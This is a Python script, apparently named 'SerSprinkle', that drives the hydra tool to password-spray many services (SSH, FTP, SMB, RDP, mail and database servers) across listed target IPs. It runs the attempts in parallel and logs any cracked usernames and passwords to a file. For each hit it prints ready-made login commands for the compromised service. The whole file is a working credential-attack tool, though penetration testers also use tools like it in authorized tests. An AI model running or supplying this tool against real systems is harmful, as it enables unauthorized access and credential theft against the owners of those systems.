#!/usr/bin/env python3

import argparse
import subprocess
import os
import shlex
import time
import datetime
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# In-run dedupe for successes
SEEN = set()

def parse_args():
    parser = argparse.ArgumentParser(description="SerSprinkle: Password spray across services")
    parser.add_argument("-t", "--targets", required=True, help="Path to IPs and services file (e.g., 10.10.10.1 \"ssh,ftp\")")
    parser.add_argument("-u", "--users", required=True, help="User or userlist file (file -> -L, single -> -l)")
    parser.add_argument("-p", "--passwords", required=True, help="Password or passwordlist file (file -> -P, single -> -p)")
    parser.add_argument("--dry-run", action="store_true", help="Only print hydra commands, don't execute")
    parser.add_argument("--sleep", type=float, default=0.0, help="Delay between each hydra run (seconds)")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent runs (per ip/service)")
    parser.add_argument("--output", default="success.txt", help="File to log successful attempts (default: success.txt)")
    return parser.parse_args()

def is_file(path):
    return os.path.isfile(path)

def parse_creds_from_hydra_line(line: str):
    """
    Hydra success lines commonly contain 'login: USER' and 'password: PASS'.
    This regex is forgiving about spacing and punctuation.
    """
    user = None
    pwd = None
    # Lowercased copy to find token positions while keeping originals
    m_user = re.search(r'login:\s*([^\s]+)', line, flags=re.IGNORECASE)
    m_pass = re.search(r'password:\s*([^\s]+)', line, flags=re.IGNORECASE)
    if m_user:
        user = m_user.group(1)
    if m_pass:
        pwd = m_pass.group(1)
    return user, pwd

def already_in_file(output_file: str, key: str) -> bool:
    if not os.path.exists(output_file):
        return False
    try:
        with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
            return key in f.read()
    except Exception:
        # If we can't read for some reason, fall back to not treating it as duplicate
        return False

def log_success(line, output_file, ip, service):
    user, pwd = parse_creds_from_hydra_line(line)
    dedupe_key = f"{ip}|{service}|{user}|{pwd}"

    if dedupe_key in SEEN or already_in_file(output_file, dedupe_key):
        print(f"[✓] Duplicate success skipped for {service} on {ip}: user='{user}' pass='{pwd}'")
        return

    SEEN.add(dedupe_key)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    # ✨ Clean uniform log entry
    entry = f"[{timestamp}] {service} on {ip} -> user='{user}' pass='{pwd}'\n"

    try:
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(entry)
    except Exception as e:
        print(f"[!] Failed writing to {output_file}: {e}")

    # Console still shows extra details
    print(f"[✓] Credentials found for {service} on {ip} -> user='{user}' pass='{pwd}'")

    svc = service.lower()
    if user and pwd:
        if svc == "ssh":
            print(f"   → Try: ssh {user}@{ip}  # password: {pwd}")
        elif svc == "ftp":
            print(f"   → Try: ftp {ip}  # then login as {user} with password: {pwd}")
        elif svc.startswith("smb"):
            print(f"   → Try: smbclient -U '{user}%{pwd}' //{ip}/share")
        elif svc in ("smtp", "smtps"):
            print(f"   → Try: swaks --server {ip} -au '{user}' -ap '{pwd}'")
        elif svc == "rdp":
            print(f"   → Try: xfreerdp /u:{user} /p:'{pwd}' /v:{ip}")
        elif svc == "imap":
            print(f"   → Try: openssl s_client -connect {ip}:143  # then: A1 LOGIN {user} {pwd}")
        elif svc == "pop3":
            print(f"   → Try: openssl s_client -connect {ip}:110  # then: USER {user} / PASS {pwd}")
        elif svc == "mysql":
            print(f"   → Try: mysql -h {ip} -u {user} -p  # password: {pwd}")
        elif svc == "mssql":
            print(f"   → Try: mssqlclient.py {user}@{ip} -windows-auth  # pwd: {pwd}")
        elif svc == "postgres":
            print(f"   → Try: psql -h {ip} -U {user}  # password: {pwd}")

def run_hydra(ip, service, user_arg, pass_arg, dry_run, sleep_time, output_file):
    cmd = ["hydra"] + user_arg + pass_arg + [ip, service]
    cmd_str = ' '.join(cmd)
    print(f"[+] Running: {cmd_str}")

    if dry_run:
        return

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = (result.stdout or "") + (result.stderr or "")

        # Scan lines for success hits
        for line in output.splitlines():
            # A loose check: most hydra successes have both tokens
            if ("login:" in line.lower()) and ("password:" in line.lower()):
                log_success(line.strip(), output_file, ip, service)

    except Exception as e:
        print(f"[!] Error running hydra: {e}")

    # Inter-run delay
    time.sleep(sleep_time)

def spray(targets, users, passwords, dry_run=False, sleep_time=0.0, max_threads=1, output_file="success.txt"):
    # Choose -l/-L and -p/-P based on whether args are files
    user_arg = ["-L", users] if is_file(users) else ["-l", users]
    pass_arg = ["-P", passwords] if is_file(passwords) else ["-p", passwords]

    with open(targets, "r", encoding="utf-8", errors="ignore") as f:
        targets_data = [line.strip() for line in f if line.strip()]

    task_list = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for target_line in targets_data:
            try:
                parts = shlex.split(target_line)  # supports quoted "svc1,svc2"
                ip = parts[0]
                services = parts[1].split(",")
            except Exception as e:
                print(f"[!] Error parsing line: '{target_line}': {e}")
                continue

            for service in services:
                service = service.strip()
                if not service:
                    continue
                task = executor.submit(run_hydra, ip, service, user_arg, pass_arg, dry_run, sleep_time, output_file)
                task_list.append(task)

        for task in as_completed(task_list):
            pass  # wait for all

if __name__ == "__main__":
    args = parse_args()
    spray(
        targets=args.targets,
        users=args.users,
        passwords=args.passwords,
        dry_run=args.dry_run,
        sleep_time=args.sleep,
        max_threads=args.threads,
        output_file=args.output
    )
